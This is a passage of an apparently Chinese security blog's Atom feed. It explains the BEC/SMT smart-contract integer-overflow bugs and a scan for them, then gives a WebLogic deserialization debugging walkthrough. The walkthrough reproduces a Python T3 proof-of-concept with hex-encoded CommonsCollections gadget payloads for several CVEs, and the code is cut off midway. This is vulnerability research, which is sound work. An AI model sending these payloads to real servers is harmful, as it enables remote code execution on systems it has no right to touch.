class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;your_code_file.js&quot;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;your_code_file.js&lt;/code&gt; 的内容例如&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;define(&lt;span class=&quot;string&quot;&gt;&quot;your_code_file.js&quot;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;require, module, exports, process&lt;/span&gt;)&lt;/span&gt;&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;use strict&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// your original code&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中&lt;code&gt;define&lt;/code&gt;语句是工具自动生成的。&lt;/p&gt;
&lt;p&gt;工具会在之前的处理逻辑里把&lt;code&gt;global&lt;/code&gt;变量以及&lt;code&gt;require&lt;/code&gt;函数重写，导致不能直接调用nodejs中原本的&lt;code&gt;require&lt;/code&gt;函数。处理后的&lt;code&gt;require&lt;/code&gt;函数无法获取到&lt;code&gt;child_process&lt;/code&gt;模块。&lt;br&gt;
    
    </summary>
    
      <category term="奇技淫巧" scheme="http://5alt.me/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
  </entry>
  
  <entry>
    <title>批量扫描智能合约中的整数溢出问题</title>
    <link href="http://5alt.me/2018/04/%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98/"/>
    <id>http://5alt.me/2018/04/批量扫描智能合约中的整数溢出问题/</id>
    <published>2018-04-25T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>最近币圈接连出了两个大漏洞，BEC和SMT这两种智能合约存在整数溢出问题，导致可以凭空造币。目前已经出了几篇分析的文章，我也在这里蹭一波热点，说一些其他的东西。</p><p>在说其他的之前，还是先提一遍原理。</p><p>根据<a href="http://solidity.readthedocs.io/zh/latest/types.html#integers" target="_blank" rel="noopener">Solidity 的文档</a>，我们可以看到，在这个语言里的整数分为int(有符号)/uint(无符号)两种。变量步长为8，支持从uint8/int8到uint256/int256。uint和int默认代表uint256和int256。对整数的运算是会有溢出问题的。其他更详细的原理分析可以参考<a href="https://www.anquanke.com/post/id/106382" target="_blank" rel="noopener">这篇文章</a>。<br><a id="more"></a><br>首先看 BEC 的代码。完整代码<a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code" target="_blank" rel="noopener">点这里</a>。更加详细的分析<a href="https://paper.seebug.org/582/" target="_blank" rel="noopener">点这里</a>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BEC</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint cnt = _receivers.length;</span><br><span class="line">    uint256 amount = uint256(cnt) * _value;</span><br><span class="line">    <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;= <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">require</span>(_value &gt; <span class="number">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(amount);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; cnt; i++) &#123;</span><br><span class="line">        balances[_receivers[i]] = balances[_receivers[i]].add(_value);</span><br><span class="line">        Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数接收两个参数，一个是address的数组，一个是uint256。控制输入地址的数量<code>cnt</code>，填写一个大的<code>_value</code>，使<code>uint256 amount = uint256(cnt) * _value;</code>计算溢出为比较小的值，能过<code>balances[msg.sender] &gt;= amount</code>判断，即可触发bug。当然，这里的问题被归结为没有使用SafeMath做乘法。</p><p>再看 SMT 的代码。完整代码<a href="https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081#code" target="_blank" rel="noopener">点这里</a>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferProxy</span>(<span class="params">address _from, address _to, uint256 _value, uint256 _feeUgt,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint8 _v,bytes32 _r, bytes32 _s</span>) <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_from] &lt; _feeUgt + _value) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    uint256 nonce = nonces[_from];</span><br><span class="line">    bytes32 h = sha3(_from,_to,_value,_feeUgt,nonce);</span><br><span class="line">    <span class="keyword">if</span>(_from != ecrecover(h,_v,_r,_s)) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_to] + _value &lt; balances[_to]</span><br><span class="line">        || balances[msg.sender] + _feeUgt &lt; balances[msg.sender]) <span class="keyword">throw</span>;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] += _feeUgt;</span><br><span class="line">    Transfer(_from, msg.sender, _feeUgt);</span><br><span class="line"></span><br><span class="line">    balances[_from] -= _value + _feeUgt;</span><br><span class="line">    nonces[_from] = nonce + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数问题出现在<code>_value</code>和<code>_feeUgt</code>这两个变量上。需要使<code>balances[_from] &lt; _feeUgt + _value</code>，<code>balances[_to] + _value &lt; balances[_to]</code>，<code>balances[msg.sender] + _feeUgt &lt; balances[msg.sender])</code><em>不成立</em>即可。通过溢出<code>_feeUgt + _value</code>很容易做到。</p><p>现在问题来了，我知道了漏洞的原理，可世界上有那么多智能合约，应该怎么批量扫描这类漏洞呢。<br>我们重新看一遍上面两个漏洞。漏洞的原因是整数溢出，漏洞的特征是函数有两个以上可以控制的<em>参与运算和判断的数字</em>。如果只能传入一个数字参与运算的话，一般来说是无法触发整数溢出的。BEC 的问题函数除了<code>_value</code>之外还有个隐藏参数是<code>_receivers.length</code>。SMT 就是明显的传入了两个参数<code>_value</code>和<code>_feeUgt</code>。因此要批量扫描这类问题，只需要找到接收数组或者多个参数的transfer函数即可。</p><p>在4月25日下午我们写了爬虫，爬取了<code>https://etherscan.io/tokens</code>上列出的开源的知名智能合约代码。并从火币网爬取了正在交易的 ERC20 代币，下载其源码。我们在下载到的368个智能合约代码中批量查找以上特征，没有发现受到影响的代币。</p><p>在4月25日傍晚看到<a href="https://mp.weixin.qq.com/s/L0gn5zXPXKcdmzygpoM_Rg" target="_blank" rel="noopener">微信公众号上有文章</a>称发现多个ERC20智能合约遭受proxyOverflow漏洞影响。我们发现，该文章中列出的智能合约并不是知名的智能合约，有一部分和一些知名智能合约重名（通过智能合约的地址就能区分），有些甚至已经很久不活跃了。这些智能合约的特点是都使用了<code>transferProxy</code>这个有漏洞的函数。</p><p>当然，智能合约的问题不止是整数溢出问题，智能合约一旦出问题就不能修补，直接死亡。不过目前来看，智能合约代码量少，互相借鉴程度高，只要抄袭了热门项目的代码，出现问题的概率还是很低的。</p><p>参考文献<br><a href="http://solidity.readthedocs.io" target="_blank" rel="noopener">http://solidity.readthedocs.io</a><br><a href="https://www.anquanke.com/post/id/106382" target="_blank" rel="noopener">https://www.anquanke.com/post/id/106382</a><br><a href="https://paper.seebug.org/582/" target="_blank" rel="noopener">https://paper.seebug.org/582/</a><br><a href="https://mp.weixin.qq.com/s/L0gn5zXPXKcdmzygpoM_Rg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/L0gn5zXPXKcdmzygpoM_Rg</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近币圈接连出了两个大漏洞，BEC和SMT这两种智能合约存在整数溢出问题，导致可以凭空造币。目前已经出了几篇分析的文章，我也在这里蹭一波热点，说一些其他的东西。&lt;/p&gt;
&lt;p&gt;在说其他的之前，还是先提一遍原理。&lt;/p&gt;
&lt;p&gt;根据&lt;a href=&quot;http://solidity.readthedocs.io/zh/latest/types.html#integers&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Solidity 的文档&lt;/a&gt;，我们可以看到，在这个语言里的整数分为int(有符号)/uint(无符号)两种。变量步长为8，支持从uint8/int8到uint256/int256。uint和int默认代表uint256和int256。对整数的运算是会有溢出问题的。其他更详细的原理分析可以参考&lt;a href=&quot;https://www.anquanke.com/post/id/106382&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这篇文章&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="以太坊" scheme="http://5alt.me/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic反序列化漏洞分析与调试</title>
    <link href="http://5alt.me/2018/04/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://5alt.me/2018/04/weblogic反序列化漏洞分析与调试/</id>
    <published>2018-04-19T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装-weblogic"><a href="#安装-weblogic" class="headerlink" title="安装 weblogic"></a>安装 weblogic</h2><h3 id="官网下载安装"><a href="#官网下载安装" class="headerlink" title="官网下载安装"></a>官网下载安装</h3><p>下载地址 <a href="http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html</a> ，需要注册账号。</p><p>安装完之后会弹出向导配置，在 Mac 上安装报错<code>java.io.IOException: Too many open files</code>，需要执行以下命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kern.maxfiles=20480</span><br><span class="line">sudo sysctl -w kern.maxfilesperproc=18000</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>安装完毕版本是 12.2.1.3.0。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://superuser.com/questions/433746/is-there-a-fix-for-the-too-many-open-files-in-system-error-on-os-x-10-7-1" target="_blank" rel="noopener">https://superuser.com/questions/433746/is-there-a-fix-for-the-too-many-open-files-in-system-error-on-os-x-10-7-1</a></p><h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><p>直接用 Vulhub 的这个镜像 <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271</a> 。<br>安装完毕版本是 10.3.6.0。</p><h2 id="调试-weblogic"><a href="#调试-weblogic" class="headerlink" title="调试 weblogic"></a>调试 weblogic</h2><p>在 <code>/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/setDomainEnv.sh</code> 里使<code>local_debug</code>为<code>true</code>就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export local_debug=&quot;true&quot;</span><br><span class="line">if [ &quot;$&#123;local_debug&#125;&quot; = &quot;true&quot; ] ; then</span><br><span class="line">JAVA_DEBUG=&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=$&#123;DEBUG_PORT&#125;,server=y,suspend=n -Djava.compiler=NONE&quot;</span><br><span class="line">export JAVA_DEBUG</span><br><span class="line">JAVA_OPTIONS=&quot;$&#123;JAVA_OPTIONS&#125; $&#123;enableHotswapFlag&#125; $&#123;debugpatchAgent&#125; -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole...&quot;</span><br><span class="line">export JAVA_OPTIONS</span><br></pre></td></tr></table></figure></p><p>运行<code>startWebLogic.sh</code>启动服务。</p><p>在 IDEA 里新建一个 java 工程，在<code>File-&gt;Project Structure</code>里找到<code>Libraries</code>，添加<code>Oracle/Middleware/Oracle_Home/wlserver/modules</code>。然后新建一个<code>Remote</code>的<code>Run/Debug Configurations</code>，设置好端口号和搜索资源的 module。下好断点即可 debug。</p><p>感谢头师傅的指导。</p><h2 id="从-CVE-2015-4852-看起"><a href="#从-CVE-2015-4852-看起" class="headerlink" title="从 CVE-2015-4852 看起"></a>从 CVE-2015-4852 看起</h2><p>CVE-2015-4852 是 java 反序列化问题引起重视并被大规模利用适合的 weblogic 的洞。根据<code>@breenmachine</code>的文章，他当时找漏洞的方法是，对 weblogic 在 7001 端口的 T3 协议进行抓包，发现流量中有 java 反序列化之后数据的 Magic <code>ac ed 00 05</code>，然后替换掉对应的部分。作者抓包时执行的脚本是<code>root@us-l-breens:/opt/OracleHome/user_projects/domains/base_domain/bin# ./stopWebLogic.sh</code>。即在停止 weblogic 服务的时候，会往 7001 端口以 T3 协议认证并发送命令。即使作者输入了错误的用户名密码，也会有反序列化的数据存在。因此这个利用没有任何限制。</p><p>关于 T3 协议 oracle 给的资料并不多，只说该协议用于 WebLogic Server 之间或者 Server 与 client 的 RMI 通信。<br>在这个时候，weblogic 没有进行任何的过滤，而常用的库如 CommonsCollections 有现成的 gadget 可以用，导致直接 RCE。在这之后，weblogic 用黑名单的方式对反序列化的类做了一些过滤，后面的几个 cve 也都是绕过黑名单。</p><p>在此复制一份 iswin 大佬写的无害poc。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  @author iswin@threathunter.org</span></span><br><span class="line"><span class="comment">#  reffer: nessus</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</span><br><span class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</span><br><span class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t3handshake</span><span class="params">(sock,server_addr)</span>:</span></span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'handshake successful'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span><span class="params">(sock,port)</span>:</span></span><br><span class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></span><br><span class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</span><br><span class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></span><br><span class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(<span class="number">2048</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock,data)</span>:</span></span><br><span class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></span><br><span class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span 